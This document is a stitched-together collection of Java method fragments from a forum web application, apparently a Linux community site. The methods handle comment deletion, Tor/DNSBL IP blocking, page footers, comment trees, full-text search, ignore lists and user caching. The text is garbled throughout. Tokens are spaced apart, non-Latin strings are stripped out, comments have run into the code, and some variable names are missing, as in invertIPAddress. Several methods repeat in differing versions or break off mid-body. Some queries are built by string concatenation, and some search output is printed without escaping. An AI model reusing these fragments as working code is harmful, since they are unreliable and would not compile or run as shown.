public String deleteAllComments ( Connection db , Logger logger , User moderator ) throws SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; try { deleter = new CommentDeleter ( db , logger ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , true ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , - 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . toString ( ) ; } 
public static void checkBlockIP ( Connection db , String addr ) throws AccessViolationException , SQLException , UnknownHostException , TextParseException { DNSBLClient dnsbl = new DNSBLClient ( " tor.ahbl.org " ) ; if ( dnsbl . checkIP ( addr ) ) { throw new AccessViolationException ( " : tor.ahbl.org " ) ; } IPBlockInfo block = getBlockInfo ( db , addr ) ; if ( block = = null ) { return ; } block . checkBlock ( ) ; } 
private static synchronized void initServletLogger ( ServletContext context ) { if ( siteLogger = = null ) { siteLogger = new ServletLogger ( context ) ; 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " top100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { siteLogger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public boolean checkIP ( String addr ) throws TextParseException { String query = invertIPAddress ( addr ) + " . " + zone ; logger . fine ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
private static String invertIPAddress ( String originalIPAddress ) { StringTokenizer = new StringTokenizer ( originalIPAddress , " . " ) ; String inverted = . nextToken ( ) ; while ( . hasMoreTokens ( ) ) { inverted = . nextToken ( ) + " . " + inverted ; } return inverted ; } 
public static boolean getTor ( String addr ) throws TextParseException , UnknownHostException { DNSBLClient dnsbl = new DNSBLClient ( " tor.ahbl.org " ) ; return ( dnsbl . checkIP ( addr ) ) ; } 
public String deleteComment ( int msgid , String reason , User user , int scoreBonus ) throws SQLException { st1 . clearParameters ( ) ; st2 . clearParameters ( ) ; st1 . setInt ( 1 , msgid ) ; st2 . setInt ( 1 , msgid ) ; st2 . setInt ( 2 , user . getId ( ) ) ; st2 . setString ( 3 , reason ) ; st4 . setInt ( 1 , scoreBonus ) ; st4 . setInt ( 2 , msgid ) ; st1 . executeUpdate ( ) ; st2 . executeUpdate ( ) ; st4 . executeUpdate ( ) ; logger . info ( " " + msgid + " " + user . getNick ( ) + " ` " + reason + '\'' ) ; return " " + msgid + " " ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) throws SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + + ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . toString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " top100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String deleteAllComments ( Connection db , User moderator ) throws SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; try { deleter = new CommentDeleter ( db ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , true ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , - 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . toString ( ) ; } 
private void buildTree ( ) { for ( Comment comment : comments ) { CommentNode node = new CommentNode ( comment ) ; 
public void buildList ( List < Comment > list ) { if ( comment ! = null ) list . add ( comment ) ; for ( CommentNode child : childs ) { child . buildList ( list ) ; 
public void hideNode ( Set < Integer > hideSet ) { if ( comment ! = null ) { hideSet . add ( comment . getMessageId ( ) ) ; } for ( CommentNode child : childs ) { child . hideNode ( hideSet ) ; 
public String showAll ( boolean reverse , int offset , int limit ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . toString ( ) ; } 
public String showFiltered ( boolean reverse , int offset , int limit ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public String showSubtree ( int parentId ) throws IOException , SQLException , UtilException , MessageNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . toString ( ) ; } 
public String showAll ( boolean reverse , int offset , int limit ) throws IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . toString ( ) ; } 
public String showFiltered ( boolean reverse , int offset , int limit ) throws IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public String showSubtree ( int parentId ) throws IOException , UtilException , MessageNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . toString ( ) ; } 
public int getCommentPage ( Comment comment , Template tmpl ) throws UtilException { int messages = tmpl . getProf ( ) . getInt ( " messages " ) ; boolean reverse = tmpl . getProf ( ) . getBoolean ( " newfirst " ) ; return getCommentPage ( comment , messages , reverse ) ; } 
public static String showComments ( Connection db , String nick ) throws SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate FROM sections, groups, topics, comments, users WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND comments.userid=users.id AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, nick, score, max_score, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
private String printResults ( ResultSet rs ) throws SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public boolean isIgnored ( Map < Integer , String > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . containsValue ( nick ) ; } 
public String showFiltered ( Connection db , boolean reverse , int offset , int limit , int filterChain , String nick ) throws IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public static int parseFilterChain ( String filter ) { if ( filter . equals ( " list " ) ) { return FILTER_IGNORED ; } if ( filter . equals ( " anonymous " ) ) { return FILTER_ANONYMOUS ; } if ( filter . equals ( " listanon " ) ) { return FILTER_IGNORED + FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public static String toString ( int filterMode ) { switch ( filterMode ) { case FILTER_NONE : return " show " ; 
public static Map < Integer , String > getIgnoreListHash ( Connection db , String nick ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new Hashtable < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public void addNick ( Connection db , String nick ) throws SQLException , UserNotFoundException { User user = new User ( db , nick ) ; int id = user . getId ( ) ; if ( ! ignoreList . containsKey ( id ) ) { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO ignore_list (userid,ignored) VALUES(?,?) " ) ; 
public boolean removeNick ( Connection db , int uid ) throws SQLException { if ( ! ignoreList . containsKey ( uid ) ) return false ; PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public static void main ( String [ ] args ) throws IOException { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
public static String showComments ( Connection db , String nick ) throws SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public boolean isIgnored ( Map < Integer , String > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . keySet ( ) . contains ( userid ) ; } 
public String showAll ( boolean reverse , int offset , int limit ) throws IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . toString ( ) ; } 
public String showFiltered ( Connection db , boolean reverse , int offset , int limit , int filterChain , String nick ) throws IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public String showSubtree ( int parentId ) throws IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . toString ( ) ; } 
public void addNick ( Connection db , String nick ) throws SQLException , UserNotFoundException { User user = User . getUser ( db , nick ) ; int id = user . getId ( ) ; if ( ! ignoreList . containsKey ( id ) ) { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO ignore_list (userid,ignored) VALUES(?,?) " ) ; 
public static User getCurrentUser ( Connection db , HttpSession session ) throws SQLException , UserNotFoundException { if ( ! Template . isSessionAuthorized ( session ) ) { return null ; } return getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . getId ( ) ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + 300 * 1000 ) ) ; return user ; } 
public static User getUser ( Connection db , int id ) throws SQLException , UserNotFoundException { return getUser ( db , id , false ) ; } 
public static User getUserCached ( Connection db , int id ) throws SQLException , UserNotFoundException { return getUser ( db , id , true ) ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . get ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . set ( cacheId , res , new Date ( new Date ( ) . getTime ( ) + 300 * 1000 ) ) ; } return res ; } 
public boolean isAnonymousScore ( ) { return isAnonymous ( ) | | isBlocked ( ) | | score < ANONYMOUS_LEVEL_SCORE ; } 
public String get ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { try { long current = new Date ( ) . getTime ( ) ; Connection db = tmpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { tmpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public static boolean isAnonymousProfile ( String name ) { if ( name = = null ) { return true ; } return name . startsWith ( " _ " ) ; } 
private String printResults ( ResultSet rs ) throws SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
private String printResults ( ResultSet rs ) throws SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " top100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public int saveNewMessage ( Connection db , String remoteAddr ) throws SQLException { PreparedStatement pst = null ; PreparedStatement pstMsgbase = null ; try { allocation MSGID 
public Message getNextMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public boolean isEditable ( ) { return ! ( isExpired ( ) | | isDeleted ( ) ) & & section . isPremoderated ( ) ; } 
public boolean isPremoderated ( ) { return moderate ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . 